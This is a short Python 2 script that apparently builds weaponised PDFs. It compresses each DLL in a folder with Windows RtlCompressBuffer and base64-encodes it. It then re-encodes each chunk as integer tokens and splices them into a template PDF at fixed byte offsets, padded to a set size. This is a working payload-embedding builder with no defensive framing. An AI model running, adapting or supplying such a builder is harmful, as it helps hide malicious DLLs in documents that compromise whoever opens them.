from ctypes import *
from ctypes import wintypes
import struct
import base64
import binascii
import os, shutil

ext = ".dll"
pdfin = open("Abc.pdf","rb").read()
try:
	os.mkdir("Result")
except:
	shutil.rmtree("Result")
	os.mkdir("Result")

def toHex(n):
	return "%02x" % n
	
def toHex8(n):
	return "%08x" % n	

			
for files in os.listdir("."):
	if files.endswith(ext):
		in_data = open(files,'rb').read()

		while len(in_data) < 0xB400:
			in_data += "\x00"

		print 	len(in_data)
			
		_CompressionFormatAndEngine = 0x02
		_UncompressedBuffer = in_data
		_UncompressedBufferSize = len(in_data)
		_CompressedBuffer = wintypes.create_string_buffer(len(in_data))
		_CompressedBufferSize = 0x01010101
		_UncompressedChunkSize = 0x1024
		_FinalCompressedSize = pointer(wintypes.c_ulong())
		_WorkSpace = wintypes.create_string_buffer(0x50000)




		windll.ntdll.RtlCompressBuffer(	_CompressionFormatAndEngine, 
										_UncompressedBuffer, 
										_UncompressedBufferSize, 
										_CompressedBuffer, 
										_CompressedBufferSize, 
										_UncompressedChunkSize, 
										_FinalCompressedSize, 
										_WorkSpace
										)



		size = _FinalCompressedSize[0]
		input = _CompressedBuffer

		print toHex(size)

		required_input = _CompressedBuffer[0:size]

		encode_base64 = base64.b64encode(required_input)

		while len(encode_base64)%4 != 0:
			encode_base64 += "\x00"

		print len(encode_base64)	

		text = ""	
		for i in range(0,len(encode_base64),4):
			a = encode_base64[i+0]
			b = encode_base64[i+1]
			c = encode_base64[i+2]
			d = encode_base64[i+3]
			reverse = d+c+b+a
			text += "ue\\(" + str(int(bin(int(binascii.hexlify(reverse), 16)),2)) + "\)+" 
			
			
		first_part = pdfin[0:0x24c33]

		last_part = pdfin[0x675f9::]

		text = text[0:len(text)-1] + "\x3b" + "\r\n"

		prep = first_part + text + last_part	

		junk = "\x20" * (0xCA548 - len(prep))

		final = first_part + text + junk + last_part
			
		output = open("Result\\" + files + ".pdf","wb")
		output.write(final)
		output.close()	

	
	